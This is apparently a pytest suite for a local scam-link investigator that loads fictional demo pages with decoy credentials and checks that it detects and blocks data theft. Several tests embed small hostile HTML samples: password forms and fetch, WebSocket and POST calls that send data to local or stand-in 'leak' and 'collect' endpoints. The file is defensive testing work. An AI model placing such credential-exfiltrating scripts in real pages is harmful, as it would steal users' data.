import time

import pytest

from app import investigator
from app.evidence import valid_completed
from app.verdict import combine

PLAIN = {"label": "legitimate", "abstained": False, "reasons": []}


@pytest.mark.parametrize(
    "page,field",
    [
        ("verify", "password"),
        ("reward", "gift_card"),
        ("help", "ssn"),
        ("track", "card_number"),
    ],
)
def test_live_sensitive_pages(server, page, field):
    result = investigator.investigate(server + f"/mock/lumora/{page}.html")
    assert result["status"] == "done", result
    assert result["mode"] == "live" and not result["simulated"]
    assert field in result["fields_requested"]
    assert valid_completed(result)
    if page == "verify":
        assert result["canaries_cross_origin"]
    if page == "track":
        assert result["cross_origin_final"] and len(result["redirect_chain"]) >= 2
    if page == "help":
        assert result["ai_directed_text"]
    assert combine(PLAIN, result)["verdict"] == "likely_scam"
    assert result["duration_ms"] < 10000


def test_live_bill_is_clean(server):
    result = investigator.investigate(server + "/mock/lumora/bill.html")
    assert result["status"] == "done", result
    assert result["fields_requested"] == [] and not result["canaries_sent_to"]
    assert combine(PLAIN, result)["verdict"] == "looks_fine"


def test_download_attempt_is_detected_without_saving_file(server):
    result = investigator.investigate(server + "/mock/lumora/attachment.html")
    assert result["status"] == "done", result
    assert result["download_attempted"]
    assert combine(PLAIN, result)["verdict"] == "suspicious"


def test_blocked_initial_url_never_launches_worker(monkeypatch):
    def forbidden(*args, **kwargs):
        raise AssertionError("Worker must not launch")

    monkeypatch.setattr(investigator.subprocess, "Popen", forbidden)
    assert investigator.investigate("http://example.com/")["status"] == "blocked"


def test_live_timeout_is_bounded_and_inconclusive(server):
    started = time.monotonic()
    result = investigator.investigate(server + "/mock/lumora/slow.html")
    assert result["status"] == "failed", result
    assert time.monotonic() - started < 10
    assert combine(PLAIN, result)["verdict"] == "inconclusive"


@pytest.mark.parametrize(
    "url,kind",
    [
        ("https://example.com/script.js", "script"),
        ("http://localhost:9000/mock/collect", "document"),
        ("http://localhost:8000/api/reset", "fetch"),
        ("http://localhost:8000/static/phone.js", "script"),
        ("http://localhost:8000/mock/%2e%2e/api/reset", "document"),
    ],
)
def test_request_policy_blocks_external_or_non_demo(url, kind):
    assert not investigator.allowed_request(url, kind)


def test_request_policy_allows_canary_query_and_local_css():
    assert investigator.allowed_request(
        "http://127.0.0.1:8000/mock/lumora/collect.html?name=Decoy+Twin", "document"
    )
    assert investigator.allowed_request(
        "http://localhost:8000/static/mock.css", "stylesheet"
    )


@pytest.mark.parametrize("behavior", ["network", "websocket", "popup", "frame"])
def test_hostile_demo_requests_do_not_reach_another_port(behavior):
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
    from threading import Thread

    reached = []

    class Receiver(BaseHTTPRequestHandler):
        def do_GET(self):
            reached.append(self.path)
            self.send_response(200)
            self.end_headers()

        def log_message(self, *args):
            pass

    receiver = ThreadingHTTPServer(("127.0.0.1", 0), Receiver)
    port = receiver.server_address[1]

    class Demo(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            if "child.html" in self.path:
                body = "<p>Fictional child page</p>"
            elif behavior == "network":
                body = f'<form action="http://127.0.0.1:{port}/collect"><input name="password" type="password"><button>Continue</button></form><script>fetch("http://127.0.0.1:{port}/leak");fetch("https://example.invalid/leak");</script>'
            elif behavior == "websocket":
                body = (
                    f'<script>new WebSocket("ws://127.0.0.1:{port}/socket");</script>'
                )
            elif behavior == "popup":
                body = '<script>const w=window.open("/mock/lumora/child.html");setTimeout(()=>w.close(),100);</script>'
            else:
                body = '<script>const f=document.createElement("iframe");f.src="/mock/lumora/child.html";document.body.append(f);setTimeout(()=>f.remove(),100);</script>'
            self.wfile.write(
                (
                    "<html><body>DEMO PAGE – NOT A REAL COMPANY"
                    + body
                    + "</body></html>"
                ).encode()
            )

        def log_message(self, *args):
            pass

    demo = ThreadingHTTPServer(("127.0.0.1", 8000), Demo)
    threads = [
        Thread(target=server.serve_forever, daemon=True) for server in (receiver, demo)
    ]
    for thread in threads:
        thread.start()
    try:
        result = investigator.investigate(
            "http://localhost:8000/mock/lumora/network-test.html"
        )
        if behavior in {"network", "websocket"}:
            assert result["status"] in {"blocked", "failed"}, result
            if result["status"] == "blocked":
                assert result["blocked_requests"] >= (2 if behavior == "network" else 1)
        else:
            assert result["status"] == "failed", result
            assert result["uninspected_content"]
        assert not reached
        assert combine(PLAIN, result)["verdict"] == "inconclusive"
    finally:
        demo.shutdown()
        demo.server_close()
        receiver.shutdown()
        receiver.server_close()
        for thread in threads:
            thread.join(timeout=2)


@pytest.mark.parametrize("server", ["live"], indirect=True)
def test_live_api_remains_responsive_during_timeout(server):
    import httpx

    # Reuse an initialized client to measure server response rather than client setup.
    with httpx.Client(base_url=server, timeout=2, trust_env=False) as client:
        assert client.get("/api/health").status_code == 200
        link = client.post(
            "/api/assess",
            json={
                "message_id": "slow-test",
                "text": "Demo link: " + server + "/mock/lumora/slow.html",
            },
        ).json()["links"][0]["link_id"]
        client.post(f"/api/links/{link}/investigate")
        started = time.monotonic()
        assert client.get("/api/health").status_code == 200
        assert time.monotonic() - started < 1
        for _ in range(110):
            card = client.get(f"/api/links/{link}/verdict").json()
            if card["status"] != "pending":
                break
            time.sleep(0.1)
        assert card["status"] == "failed" and card["verdict"] == "inconclusive"


@pytest.mark.parametrize("server", ["live"], indirect=True)
def test_live_browser_shows_observed_warning(server):
    from playwright.sync_api import expect, sync_playwright

    with sync_playwright() as p:
        browser = p.chromium.launch()
        page = browser.new_page(viewport={"width": 380, "height": 900})
        page.goto(server)
        expect(page.locator(".message")).to_have_count(12)
        expect(page.locator(".mode-banner")).to_contain_text("LIVE LOCAL CHECKS")
        page.locator('[data-demo-scenario="team-002"]').click()
        expect(page.locator("#verdict")).to_have_text("Likely scam", timeout=15000)
        expect(page.locator("#mode")).to_contain_text("LIVE DECOY CHECK")
        expect(page.locator("#action-warning")).to_be_visible()
        expect(page.locator("#evidence-note")).to_contain_text("Observed")
        assert page.evaluate("document.documentElement.scrollWidth<=innerWidth")
        page.screenshot(path="demo_backup/live-hidden-risk.png", full_page=True)
        browser.close()


def test_worker_timeout_uses_kill_fallback_when_tree_cleanup_fails(monkeypatch):
    from types import SimpleNamespace

    class Worker:
        pid = 12345
        killed = False
        calls = 0

        def communicate(self, *args, **kwargs):
            self.calls += 1
            if self.calls == 1:
                raise investigator.subprocess.TimeoutExpired("worker", 9)
            return ("", "")

        def kill(self):
            self.killed = True

    worker = Worker()
    monkeypatch.setattr(
        investigator.subprocess, "Popen", lambda *args, **kwargs: worker
    )
    monkeypatch.setattr(
        investigator.subprocess,
        "run",
        lambda *args, **kwargs: SimpleNamespace(returncode=1),
    )
    result = investigator.investigate("http://localhost:8000/mock/lumora/bill.html")
    assert result["status"] == "failed" and worker.killed and worker.calls == 2


@pytest.mark.parametrize(
    "payload",
    [
        '{"password":"Canary-Pass-0001"}',
        "plain Decoy Twin payload",
        '{"note":"prefix CANARY-0000-0000 suffix"}',
    ],
)
def test_canary_detection_covers_json_text_and_embedded_values(payload):
    import json
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
    from threading import Thread

    sent = []

    class Demo(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            body = (
                '<html><body>Fictional demo<script>fetch("http://127.0.0.1:8000/mock/lumora/collect.html",{method:"POST",mode:"no-cors",headers:{"Content-Type":"text/plain"},body:'
                + json.dumps(payload)
                + "});</script></body></html>"
            )
            self.wfile.write(body.encode())

        def do_POST(self):
            sent.append(
                self.rfile.read(int(self.headers.get("Content-Length", 0))).decode()
            )
            self.send_response(204)
            self.end_headers()

        def log_message(self, *args):
            pass

    server = ThreadingHTTPServer(("127.0.0.1", 8000), Demo)
    thread = Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        result = investigator.investigate(
            "http://localhost:8000/mock/lumora/canary-test.html"
        )
        assert result["status"] == "done", result
        assert sent == [payload]
        assert result["canaries_cross_origin"]
        assert result["canaries_sent_to"] == [
            "http://127.0.0.1:8000/mock/lumora/collect.html"
        ]
        assert combine(PLAIN, result)["verdict"] == "likely_scam"
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=2)
